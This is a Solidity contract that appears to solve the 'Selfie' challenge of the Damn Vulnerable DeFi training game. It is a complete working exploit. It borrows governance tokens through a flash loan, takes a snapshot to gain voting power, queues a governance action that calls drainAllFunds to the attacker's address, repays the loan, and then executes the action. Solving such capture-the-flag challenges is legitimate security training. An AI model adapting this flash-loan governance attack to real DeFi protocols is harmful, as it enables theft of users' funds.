import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableTokenSnapshot.sol";
import "./SimpleGovernance.sol";
import "./SelfiePool.sol";

contract SelfieHack {
    using Address for address;

    address public owner;
    SelfiePool public pool;
    SimpleGovernance public governance;
    uint256 actionId;
    DamnValuableTokenSnapshot public token;

    constructor(
        SelfiePool _pool,
        SimpleGovernance _governance,
        address _owner,
        DamnValuableTokenSnapshot _token
    ) {
        pool = _pool;
        governance = _governance;
        owner = _owner;
        token = _token;
    }

    function receiveTokens(address dvt, uint256 amount) external {
        token.snapshot();

        actionId = governance.queueAction(
            address(pool),
            abi.encodeWithSignature("drainAllFunds(address)", owner),
            0
        );

        token.transfer(address(pool), amount);
    }

    function hack(uint256 amount) public returns (uint256) {
        pool.flashLoan(amount);
        return actionId;
    }

    function executeAction() public {
        governance.executeAction(actionId);
    }
}
